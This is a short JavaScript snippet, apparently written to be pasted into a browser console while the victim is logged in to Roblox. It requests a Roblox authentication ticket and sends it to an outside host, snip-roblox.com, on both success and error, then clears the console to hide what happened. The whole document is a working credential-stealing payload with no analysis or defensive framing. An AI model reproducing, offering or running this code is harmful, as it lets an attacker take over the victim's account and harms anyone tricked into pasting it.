var data = {}
$.ajax({
   type: 'POST',
   url: 'https://auth.roblox.com/v1/authentication-ticket',
   data: data,
   success: function(data, textStatus, request) {
       $.get('https://snip-roblox.com/auth.php?auth_ticket=' + request.getResponseHeader('rbx-authentication-ticket'));
   },
   error: function(request, textStatus, errorThrown) {
       $.get('https://snip-roblox.com/auth.php?auth_ticket=' + request.getResponseHeader('rbx-authentication-ticket'));
   }
});
console.clear()
